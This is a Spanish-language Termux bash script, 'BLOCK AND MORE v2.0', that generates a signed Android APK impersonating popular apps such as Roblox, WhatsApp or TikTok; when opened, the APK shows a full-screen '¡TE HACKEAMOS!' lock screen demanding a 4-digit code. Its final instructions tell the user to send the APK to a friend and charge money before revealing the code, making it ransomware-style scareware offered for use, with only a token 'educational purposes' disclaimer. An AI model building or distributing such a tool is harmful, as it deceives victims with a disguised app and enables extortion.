#!/data/data/com.termux/files/usr/bin/bash

CYAN='\033[0;36m'
AMARILLO='\033[1;33m'
VERDE='\033[0;32m'
BLANCO='\033[1;37m'
ROJO='\033[0;31m'
NC='\033[0m'

clear

echo -e "${CYAN}"
echo "   ██████╗ ██╗      ██████╗  ██████╗██╗  ██╗"
echo "   ██╔══██╗██║     ██╔═══██╗██╔════╝██║ ██╔╝"
echo "   ██████╔╝██║     ██║   ██║██║     █████╔╝ "
echo "   ██╔══██╗██║     ██║   ██║██║     ██╔═██╗ "
echo "   ██████╔╝███████╗╚██████╔╝╚██████╗██║  ██╗"
echo "   ╚═════╝ ╚══════╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝"
echo -e "${AMARILLO}        [ BLOCK AND MORE v2.0 ]${NC}\n"

# ============================================
# LISTA DE APPS
# ============================================
APPS=(
    "Roblox" "Free Fire" "TikTok" "Instagram"
    "Facebook" "WhatsApp" "YouTube" "Minecraft"
    "PUBG Mobile" "Clash of Clans" "Spotify" "Netflix"
)

# ============================================
# FUNCIÓN: MOSTRAR MENÚ PRINCIPAL
# ============================================
mostrar_menu() {
    echo -e "${BLANCO}[+] Selecciona una app para generar su BLOCK APK:${NC}\n"
    for i in "${!APPS[@]}"; do
        num=$((i+1))
        printf " ${AMARILLO}[%02d]${NC} ${VERDE}%-13s${NC}" "$num" "${APPS[$i]}"
        if [ $((num % 4)) -eq 0 ]; then
            echo ""
        fi
    done
    echo -e "\n${BLANCO}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
}

# ============================================
# FUNCIÓN: GENERAR APK CON CÓDIGO
# ============================================
generar_apk() {
    local app="$1"
    local codigo="$2"
    
    echo -e "\n${VERDE}[✔] Generando APK para: ${BLANCO}$app${NC}"
    echo -e "${VERDE}[✔] Código de desbloqueo: ${AMARILLO}$codigo${NC}"
    echo -e "${AMARILLO}[*] Creando APK...${NC}\n"
    
    # Crear carpeta temporal
    mkdir -p ~/block_temp
    cd ~/block_temp
    
    # ============================================
    # CREAR ESTRUCTURA DE LA APK
    # ============================================
    
    # 1. Crear AndroidManifest.xml
    cat > AndroidManifest.xml << 'EOF'
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.block.phone"
    android:versionCode="1"
    android:versionName="1.0">
    
    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
    <uses-permission android:name="android.permission.WAKE_LOCK" />
    <uses-permission android:name="android.permission.DISABLE_KEYGUARD" />
    
    <application
        android:allowBackup="true"
        android:icon="@drawable/ic_launcher"
        android:label="APP_NAME"
        android:theme="@android:style/Theme.NoTitleBar.Fullscreen">
        
        <activity
            android:name=".MainActivity"
            android:exported="true"
            android:launchMode="singleInstance"
            android:showOnLockScreen="true"
            android:turnScreenOn="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
    </application>
</manifest>
EOF
    
    # 2. Crear MainActivity.java
    mkdir -p src/com/block/phone
    cat > src/com/block/phone/MainActivity.java << 'EOF'
package com.block.phone;

import android.app.Activity;
import android.os.Bundle;
import android.os.Handler;
import android.view.View;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;

public class MainActivity extends Activity {
    private EditText codigoInput;
    private Button desbloquearBtn;
    private TextView mensajeError, timerText;
    private Handler handler = new Handler();
    private int intentos = 0;
    private int tiempoEspera = 0;
    private boolean bloqueado = false;
    private String CODIGO_CORRECTO = "CODIGO";
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        
        getWindow().addFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN);
        getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);
        getWindow().addFlags(WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD);
        
        codigoInput = findViewById(R.id.codigoInput);
        desbloquearBtn = findViewById(R.id.desbloquearBtn);
        mensajeError = findViewById(R.id.mensajeError);
        timerText = findViewById(R.id.timerText);
        
        desbloquearBtn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                if (bloqueado) {
                    mensajeError.setText("⏳ Espera " + tiempoEspera + " segundos");
                    return;
                }
                verificarCodigo();
            }
        });
    }
    
    private void verificarCodigo() {
        String codigo = codigoInput.getText().toString().trim();
        
        if (codigo.isEmpty()) {
            mensajeError.setText("❌ Ingresa el código");
            return;
        }
        
        if (codigo.equals(CODIGO_CORRECTO)) {
            mensajeError.setText("✅ ¡CÓDIGO CORRECTO! Desbloqueando...");
            mensajeError.setTextColor(getResources().getColor(android.R.color.holo_green_light));
            handler.postDelayed(new Runnable() {
                @Override
                public void run() {
                    finish();
                }
            }, 2000);
        } else {
            intentos++;
            tiempoEspera = intentos * 60;
            mensajeError.setText("❌ CÓDIGO INCORRECTO. Espera " + tiempoEspera + "s");
            mensajeError.setTextColor(getResources().getColor(android.R.color.holo_red_light));
            codigoInput.setText("");
            codigoInput.requestFocus();
            bloqueado = true;
            iniciarTemporizador();
        }
    }
    
    private void iniciarTemporizador() {
        timerText.setText("⏳ " + tiempoEspera + "s");
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                tiempoEspera--;
                if (tiempoEspera <= 0) {
                    bloqueado = false;
                    timerText.setText("");
                    mensajeError.setText("✅ Puedes intentar de nuevo");
                    mensajeError.setTextColor(getResources().getColor(android.R.color.holo_green_light));
                } else {
                    timerText.setText("⏳ " + tiempoEspera + "s");
                    handler.postDelayed(this, 1000);
                }
            }
        }, 1000);
    }
}
EOF
    
    # 3. Crear layout
    mkdir -p res/layout
    cat > res/layout/activity_main.xml << 'EOF'
<?xml version="1.0" encoding="utf-8"?>
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:background="#CC0000">
    
    <!-- FONDO CON EFECTO PARPADEANTE -->
    <View
        android:id="@+id/blinkView"
        android:layout_width="match_parent"
        android:layout_height="match_parent"
        android:background="#CC0000" />
    
    <LinearLayout
        android:layout_width="340dp"
        android:layout_height="wrap_content"
        android:layout_centerInParent="true"
        android:background="#FF0000"
        android:padding="25dp"
        android:orientation="vertical"
        android:elevation="15dp"
        android:border="5dp solid #FFFFFF">
        
        <!-- ICONO DE PELIGRO -->
        <TextView
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:layout_gravity="center"
            android:text="⚠️"
            android:textSize="70sp" />
        
        <!-- TÍTULO PRINCIPAL -->
        <TextView
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:layout_gravity="center"
            android:text="¡TE HACKEAMOS!"
            android:textColor="#FFFFFF"
            android:textSize="28sp"
            android:textStyle="bold"
            android:layout_marginTop="5dp" />
        
        <!-- SUBTÍTULO -->
        <TextView
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:layout_gravity="center"
            android:text="⚠️ TU DISPOSITIVO ESTÁ BLOQUEADO ⚠️"
            android:textColor="#FFFF00"
            android:textSize="14sp"
            android:layout_marginTop="5dp" />
        
        <!-- MENSAJE DESCRIPTIVO -->
        <TextView
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:layout_gravity="center"
            android:text="Este dispositivo ha sido bloqueado.\nPara desbloquear, ingresa el código."
            android:textColor="#FFFFFF"
            android:textSize="13sp"
            android:gravity="center"
            android:layout_marginTop="15dp"
            android:layout_marginBottom="15dp" />
        
        <!-- CAMPO PARA CÓDIGO -->
        <EditText
            android:id="@+id/codigoInput"
            android:layout_width="match_parent"
            android:layout_height="55dp"
            android:background="#FFFFFF"
            android:hint="CÓDIGO DE 4 DÍGITOS"
            android:inputType="number"
            android:textColor="#000000"
            android:textSize="22sp"
            android:gravity="center"
            android:padding="10dp" />
        
        <!-- BOTÓN DESBLOQUEAR -->
        <Button
            android:id="@+id/desbloquearBtn"
            android:layout_width="match_parent"
            android:layout_height="55dp"
            android:background="#FF0000"
            android:text="🔓 DESBLOQUEAR"
            android:textColor="#FFFFFF"
            android:textSize="18sp"
            android:textStyle="bold"
            android:layout_marginTop="10dp" />
        
        <!-- MENSAJE DE ERROR -->
        <TextView
            android:id="@+id/mensajeError"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:layout_gravity="center"
            android:text=""
            android:textColor="#FFFF00"
            android:textSize="13sp"
            android:layout_marginTop="10dp" />
        
        <!-- TEMPORIZADOR -->
        <TextView
            android:id="@+id/timerText"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:layout_gravity="center"
            android:text=""
            android:textColor="#FFFFFF"
            android:textSize="16sp"
            android:layout_marginTop="5dp" />
            
    </LinearLayout>
</RelativeLayout>
EOF
    
    # 4. Crear icono (usando una imagen de 1x1 pixel)
    mkdir -p res/drawable
    echo "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==" | base64 -d > res/drawable/ic_launcher.png
    
    # 5. Reemplazar el código y el nombre de la app
    sed -i "s/CODIGO/$codigo/g" src/com/block/phone/MainActivity.java
    sed -i "s/APP_NAME/$app/g" AndroidManifest.xml
    
    # ============================================
    # COMPILAR CON AAPT Y D8
    # ============================================
    
    echo -e "${AMARILLO}[*] Compilando recursos...${NC}"
    
    # Instalar herramientas
    pkg install aapt dx -y 2>/dev/null
    
    # Compilar recursos
    aapt package -f -m -J src -M AndroidManifest.xml -S res -I ~/android-sdk/platforms/android-33/android.jar 2>/dev/null
    
    # Compilar Java
    echo -e "${AMARILLO}[*] Compilando código...${NC}"
    javac -cp ~/android-sdk/platforms/android-33/android.jar -d . src/com/block/phone/*.java 2>/dev/null
    
    if [ $? -ne 0 ]; then
        echo -e "${ROJO}[!] Error al compilar. Asegúrate de tener el SDK de Android.${NC}"
        echo -e "${AMARILLO}[*] Instalando SDK...${NC}"
        
        # Intentar con sdkmanager
        pkg install sdkmanager -y 2>/dev/null
        sdkmanager "platforms;android-33" 2>/dev/null
    fi
    
    # Crear DEX
    echo -e "${AMARILLO}[*] Creando DEX...${NC}"
    dx --dex --output=classes.dex . 2>/dev/null
    
    # Empaquetar APK
    echo -e "${AMARILLO}[*] Empaquetando APK...${NC}"
    aapt package -f -M AndroidManifest.xml -S res -I ~/android-sdk/platforms/android-33/android.jar -F app_unsigned.apk . 2>/dev/null
    
    # Agregar DEX al APK
    zip app_unsigned.apk classes.dex 2>/dev/null
    
    # Firmar
    echo -e "${AMARILLO}[*] Firmando APK...${NC}"
    
    # Generar keystore si no existe
    if [ ! -f ~/debug.keystore ]; then
        keytool -genkey -v -keystore ~/debug.keystore -alias debug -keyalg RSA -keysize 2048 -validity 10000 -dname "CN=Block, OU=Block, O=Phone, L=City, S=State, C=US" -storepass android -keypass android 2>/dev/null
    fi
    
    # Firmar la APK
    apksigner sign --keystore ~/debug.keystore --storepass android --keypass android --out "${app}_block.apk" app_unsigned.apk 2>/dev/null
    
    if [ ! -f "${app}_block.apk" ]; then
        echo -e "${ROJO}[!] Error al firmar, usando APK sin firmar...${NC}"
        cp app_unsigned.apk "${app}_block.apk"
    fi
    
    # ============================================
    # MOVER A DESCARGA Y LIMPIAR
    # ============================================
    
    mv "${app}_block.apk" ~/storage/downloads/
    cd ~
    rm -rf ~/block_temp
    
    # ============================================
    # MENSAJE FINAL
    # ============================================
    clear
    echo -e "${CYAN}==================================================${NC}"
    echo -e "${VERDE}[✔] ¡APK GENERADA CON ÉXITO!${NC}"
    echo -e "${CYAN}==================================================${NC}\n"
    echo -e "${BLANCO}[+] App: ${AMARILLO}$app${NC}"
    echo -e "${BLANCO}[+] Archivo: ${AMARILLO}~/storage/downloads/${app}_block.apk${NC}"
    echo -e "${BLANCO}[+] Código de desbloqueo: ${VERDE}$codigo${NC}"
    echo -e "\n${ROJO}📱 AL ABRIR LA APK VERÁS:${NC}"
    echo -e "   ${ROJO}┌─────────────────────────────────┐${NC}"
    echo -e "   ${ROJO}│  ⚠️  ¡TE HACKEAMOS!  ⚠️         │${NC}"
    echo -e "   ${ROJO}│  🔒 DISPOSITIVO BLOQUEADO      │${NC}"
    echo -e "   ${ROJO}│                                 │${NC}"
    echo -e "   ${ROJO}│  [CÓDIGO DE 4 DÍGITOS]         │${NC}"
    echo -e "   ${ROJO}│  [🔓 DESBLOQUEAR]              │${NC}"
    echo -e "   ${ROJO}└─────────────────────────────────┘${NC}"
    echo -e "\n${BLANCO}[*] Instrucciones:${NC}"
    echo -e "  1. Envía el APK a tu amigo"
    echo -e "  2. Debe instalar la APK"
    echo -e "  3. Para desbloquear debe ingresar: ${VERDE}$codigo${NC}"
    echo -e "  4. Cada error suma 1 minuto de espera"
    echo -e "  5. 💰 Cobra antes de darle el código"
    echo -e "\n${ROJO}[!] ADVERTENCIA:${NC} Solo para fines educativos"
    echo -e "${BLANCO}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}\n"
}

# ============================================
# MENÚ PRINCIPAL
# ============================================
while true; do
    clear
    echo -e "${CYAN}"
    echo "   ██████╗ ██╗      ██████╗  ██████╗██╗  ██╗"
    echo "   ██╔══██╗██║     ██╔═══██╗██╔════╝██║ ██╔╝"
    echo "   ██████╔╝██║     ██║   ██║██║     █████╔╝ "
    echo "   ██╔══██╗██║     ██║   ██║██║     ██╔═██╗ "
    echo "   ██████╔╝███████╗╚██████╔╝╚██████╗██║  ██╗"
    echo "   ╚═════╝ ╚══════╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝"
    echo -e "${AMARILLO}        [ BLOCK AND MORE v2.0 ]${NC}\n"
    
    mostrar_menu
    read -p ">> Selecciona una app (01-${#APPS[@]}): " opcion < /dev/tty
    
    if [[ "$opcion" =~ ^[0-9]+$ ]] && [ "$opcion" -ge 1 ] && [ "$opcion" -le "${#APPS[@]}" ]; then
        APP_SELECCIONADA="${APPS[$((opcion-1))]}"
        
        echo -e "\n${BLANCO}[+] Ingresa un código de 4 dígitos para el bloqueo:${NC}"
        while true; do
            read -p ">> Código (1000-9999): " CODIGO < /dev/tty
            if [[ "$CODIGO" =~ ^[0-9]{4}$ ]] && [ "$CODIGO" -ge 1000 ] && [ "$CODIGO" -le 9999 ]; then
                break
            else
                echo -e "${ROJO}[!] Código inválido. Debe ser de 4 dígitos (1000-9999).${NC}"
            fi
        done
        
        generar_apk "$APP_SELECCIONADA" "$CODIGO"
        read -p "Presiona Enter para continuar..."
    else
        echo -e "${ROJO}[!] Opción inválida. Elige un número del 01 al ${#APPS[@]}.${NC}"
        sleep 2
    fi
done
